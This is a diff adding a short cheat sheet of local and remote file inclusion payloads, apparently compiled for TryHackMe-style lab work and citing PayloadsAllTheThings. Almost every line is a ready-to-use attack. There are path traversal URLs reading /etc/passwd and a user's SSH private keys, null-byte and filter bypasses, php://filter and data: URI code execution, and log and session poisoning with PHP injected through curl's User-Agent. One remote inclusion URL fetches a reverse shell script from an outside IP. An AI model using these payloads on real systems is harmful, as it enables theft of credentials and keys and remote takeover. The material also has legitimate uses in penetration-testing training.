@@ -1,0 +1,53 @@
+#########
+## lfi ##
+#########
+## link
+# https://github.com/cyberheartmi9/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal#basic-lfi-null-byte-double-encoding-and-other-tricks
+# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
+# https://tryhackme.com/room/fileinc
+# https://tryhackme.com/r/room/filepathtraversal
+
+
+## simple
+http://$h/index.php?err=/etc/flag
+
+
+## path traversal
+http://$h/get.php?file=../../../../etc/passwd
+http://$h/get.php?file=../../../../home/daniela/.ssh/id_rsa
+http://$h/get.php?file=../../../../home/daniela/.ssh/id_ecdsa
+http://$h/get.php?file=../../../../windows/win.ini
+
+
+## null byte (php < 5.3.4)
+http://$h/get.php?file=../../../../etc/passwd%00
+
+
+## filter bypass
+# or try same with POST
+http://$h/get.php?file=../../../etc/passwd/.
+http://$h/get.php?file=....//....//....//etc/passwd
+
+
+## filter
+http://$h/page.php?file=php://filter/convert.base64-encode/resource=/etc/passwd
+http://$h/page.php?file=data:text/plain,<?php%20phpinfo();%20?>			# direct code exec
+
+
+
+## log poisoning
+curl -A "This is testing" http://$h/login.php
+curl -A "<?php phpinfo();?>" http://$h/login.php
+
+
+## sessions
+https://$h/login.php?err=/tmp/sess_vc4567al6pq7usm2cufmilkm45
+curl --cookie "PHPSESSID=0dcccu3br4dltutnqdithrnpq6" -A "<?php phpinfo();?>" http://$h/logs.php
+
+
+## RFI
+# allow_url_fopen need to be ON
+http://$h/get.php?file=http://10.8.98.114/rshell.php
+
+
+
